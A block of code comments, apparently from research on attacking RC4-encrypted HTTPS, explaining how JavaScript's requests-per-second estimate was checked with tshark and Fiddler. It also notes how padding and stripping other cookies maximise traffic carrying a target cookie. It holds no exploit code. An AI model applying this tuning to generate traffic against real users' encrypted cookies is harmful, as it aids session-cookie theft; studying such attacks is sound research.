    // Divide by 30.5 because postMessage is not executed instantly (for starting and collecting
    // results). This *underestimates* the number of requests / sconds.
    //
    // The correctness of this approach was confirmed in two ways:
    // 1. By sending requests to an unencrypted website, capturing the transmitted requests using tshark
    //    with `tshark -w test.pcapng`, and then analysing the capture in wireshark and seeing whether
    //    the requests/seconds of JavaScript matched the real number of requests.
    // 2. By sending encrypted HTTPS requests, and intercepting/decrypting them using Fiddler. While
    //    fiddler slowed down the network connection substantially, it did allow us to conform for HTTPS
    //    as well that the requests/seconds of Javascript matched those in practice.
    //
    // We used both methods above to confirm this code works for Internet Explorer 11 and Opera 27.
    // The estimate given by JavaScript is actually slightly lower than the real requests/seconds!
    //
    // There was no measurable difference in #requests/seconds between using RC4 or AES as encryption. So while
    // webmail.cs doesn't use RC4, we can still us it to estimate #requests/seconds possible. Using HTTPS does
    // seens to increase CPU usage. For final paper we need to find (or setup) two RC4 servers!!
    //
    // Also remark that we actually send too much data. We POST 300 bytes. This is to compensate for the fact
    // that these requests do not yet contain a cookie. Hence we're still underestimating the number of requests
    // we can achieve. Additionally note that we can remove all other cookies except the one we want.
